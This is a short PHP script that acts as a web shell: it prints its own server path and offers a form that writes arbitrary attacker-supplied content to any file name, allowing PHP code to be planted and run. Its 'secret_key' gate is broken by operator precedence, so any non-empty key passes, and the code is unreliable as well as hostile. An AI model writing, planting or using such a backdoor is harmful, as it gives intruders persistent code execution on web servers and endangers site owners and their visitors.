<?php 
if(!$_GET['secret_key'] == "qwerty"){
	die();
}
echo $_SERVER['SCRIPT_FILENAME']; //show all file path, where is this script located
echo "<form method='post'>
<input type='text' name='fname' value='file name example.php'><br />
<textarea type='text' name='ftext' value='file text <echo php>'></textarea></br >
<button name='Submit' type='submit'>Submit</button>
</form>";
if(!empty($_POST['fname']) && !empty($_POST['ftext'])){
	$fname = fopen($_POST['fname'], 'w+');
	fwrite($fname, $_POST['ftext']);
	fclose($fname);
}
 ?>
